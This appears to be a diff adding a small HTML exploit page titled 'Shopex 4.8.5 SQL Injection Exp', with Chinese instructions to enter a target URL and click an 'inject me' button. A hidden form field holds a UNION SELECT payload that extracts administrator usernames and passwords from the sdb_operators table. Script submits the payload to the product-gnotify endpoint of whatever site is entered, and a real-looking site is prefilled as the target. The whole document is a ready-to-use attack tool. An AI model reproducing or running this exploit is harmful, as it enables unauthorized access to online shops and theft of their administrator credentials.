@@ -1,0 +1,16 @@
+<center>
+<title>Shopex 4.8.5 SQL Injection Exp</title>
+<form action="" method="post" name="submit_url">
+网址:<input type=text name=url value="http://keio2.ys168.com/" size=62><br><br>
+<input type="hidden" name="goods[goods_id]" value="3">
+<input type="hidden" name="goods[product_id]" value="1 and 1=2 union select 1,2,3,4,5,6,7,8,concat(0x245E,username,0x2D3E,userpass,0x5E24),10,11,12,13,14,15,16,17,18,19,20,21,22 from sdb_operators">
+<input type="submit" value="给我注入"  onclick=fsubmit()>
+</form> <br /><br />填上你要注入的网址（注意要打上http:// 要不跳转不了） 点“给我注入”就要以了。
+
+<script> 
+function fsubmit(){ 
+form = document.forms[0]; 
+form.action = form.url.value+'/?product-gnotify'; 
+form.submit(); 
+} 
+</script>
